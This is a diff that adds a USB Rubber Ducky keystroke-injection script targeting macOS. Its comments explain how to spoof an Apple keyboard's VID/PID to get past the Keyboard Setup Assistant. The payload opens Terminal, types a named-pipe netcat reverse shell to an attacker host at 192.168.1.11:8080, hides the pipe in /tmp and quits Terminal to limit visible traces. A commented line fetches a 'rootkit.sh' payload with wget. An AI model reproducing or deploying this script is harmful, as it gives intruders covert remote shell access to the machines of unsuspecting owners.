@@ -1,0 +1,32 @@
+REM ducky-osx-reverse-shell.txt | usb rubber ducky script by sailboatanon | VIDPID spoofing | OSX macos
+REM https://github.com/sailboat-anon/hak5-rubber-ducky
+REM
+REM replace 192.168.1.11 and 8080 with the ip/port of your netcat server (attacking host). 
+REM i like to use my phone to catch the reverse shell - https://termux.com/
+REM run this on your attacking host: nc -l -p 8080
+REM plug the ducky into your target, then take a look at your netcat session.  you have a shell!
+REM
+REM usb setup
+REM you'll need to update the firmware to ducky2.1 (for VIDPID spoofing)
+REM https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/Firmware/Images/duck_v2.1.hex
+REM sudo sudo dfu-programmer at32uc3b1256 erase; sudo dfu-programmer at32uc3b1256 flash --suppress-bootloader-mem duck_v2.1.hex; sudo dfu-programmer at32uc3b1256 reset
+REM subvert apple's Keyboard Setup Assistant; create a vidpid.bin to spoof an Apple Keyboard 
+REM https://github.com/midnitesnake/USB-Rubber-Ducky/wiki/Keyboard_VID_PID_List
+REM https://github.com/hak5darren/USB-Rubber-Ducky/tree/master/Firmware/Utils/VID_PID_SWAPPER_1.1
+
+DELAY 500
+GUI 
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+STRING rm -f /tmp/.tmp_nc
+ENTER
+STRING mkfifo /tmp/.tmp_nc
+ENTER
+STRING cat /tmp/.tmp_nc | /bin/sh /dev/stdin 2>&1 | nc 192.168.1.11 8080 > /tmp/.tmp_nc & disown
+ENTER
+REM the script must exit quickly (to reduce UI exposure), so lets get additional payloads for use in our reverse shell
+REM wget -O /tmp/.tmp_pl http://sailboatanon.local/rootkit.sh -T 7
+STRING clear;exit
+GUI Q
